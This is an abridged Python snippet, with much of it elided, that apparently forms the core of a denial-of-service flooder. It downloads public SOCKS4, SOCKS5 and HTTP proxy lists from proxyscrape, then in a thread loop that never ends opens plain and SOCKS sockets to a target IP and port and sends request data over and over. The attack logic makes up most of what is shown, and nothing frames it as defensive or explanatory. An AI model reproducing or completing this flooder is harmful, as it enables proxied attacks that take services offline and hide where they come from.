import threading, random, requests, socket, socks
...
def __main__():
    ...
    r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=50000&country=all&ssl=yes&anonymity=all')
    r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all")
    r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=50000&country=all&ssl=yes&anonymity=all')
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                rf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s = socks.socksocket()
                s.connect((str(ip), int(port)))
                rf.connect((ip, port))
                s.send(str.encode(request))
                s.send(data)
                rf.send(str.encode(request))
                rf.send(data)
                s.send(str.encode(request))
                s.send(data)
                rf.send(str.encode(request))
